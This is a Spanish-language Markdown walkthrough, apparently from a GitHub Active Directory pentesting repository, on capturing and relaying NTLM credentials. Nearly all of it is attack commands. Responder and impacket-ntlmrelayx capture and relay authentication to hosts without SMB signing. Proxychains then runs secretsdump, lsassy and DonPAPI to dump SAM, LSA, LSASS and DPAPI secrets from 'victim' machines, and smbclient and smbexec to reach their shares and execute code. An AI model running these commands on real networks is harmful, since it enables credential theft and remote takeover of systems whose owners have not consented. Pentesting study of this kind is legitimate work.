# Capturar credenciales NTLM y redirigirlas

```Bash
# Obtener dispositivos con el SMB sin firmar
poetry run crackmapexec smb <rango ip> --gen-relay-list <output equipos relay>
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid.gif?raw=true "Relay list")

```Bash
# Deshabilitar las opciones SMB y HTTP de Responder y ejecutarlo
sudo python responder.py -I <Interfaz de red>
# Ejecutar ntlmrelayx con socks para capturar y guardar la autenticación # La opción smb2support es cuando los objetivos son equipo actuales como windows 10 o Windoows server 2019
impacket-ntlmrelayx -tf <output equipos relay> -of netntlm -smb2support -socks
# Insertar el comando "socks" en la misma terminal para obtener las autenticaciones capturadas
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid2.gif?raw=true "Deshabilitar SMB y HHTP Ejecutar responder y ntlmrelayx")
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid3.gif?raw=true "Capturar autenticaciones y guardarlas en socks")

```Bash
# Primero modificar el puerto de la última línea de proxychains para que quede asi:
socks4  127.0.0.1 1080
# Redirigir la autenticación obtenida con tlmrelayx con proxychains pudiendo realizar diversas acciones, como por ejemplo

# Obtener SAM y LSA de los equipos víctima
proxychains impacket-secretsdump -no-pass '<dominio>'/'<usuario>'@'<ip víctima>'
# Obtener LSASS de los equipos víctima
proxychains lsassy --no-pass -d <dominio> -u <usuario> <ip víctima>
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid4.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 1")

# Redirigir las credenciales

```Bash
# Instalar DonPAPI con desde su github con poetry: https://github.com/login-securite/DonPAPI
# Obtener dpapi de los equipos víctima y otras como  files, browser, schedule tasks,…
proxychains poetry run DonPAPI -no-pass '<dominio>'/'<usuario>'@'<ip víctima>'
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid5.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 2")


```Bash
# Obtener acceso a las carpetas del equipo
proxychains impacket-smbclient -no-pass '<dominio>'/'<usuario>'@'<ip víctima>' -debug
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid6.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 3")

```Bash
# Obtener ejecución de código
proxychains impacket-smbexec -no-pass '<dominio>'/'<usuario>'@'<ip víctima>' -debug
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid7.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 4")

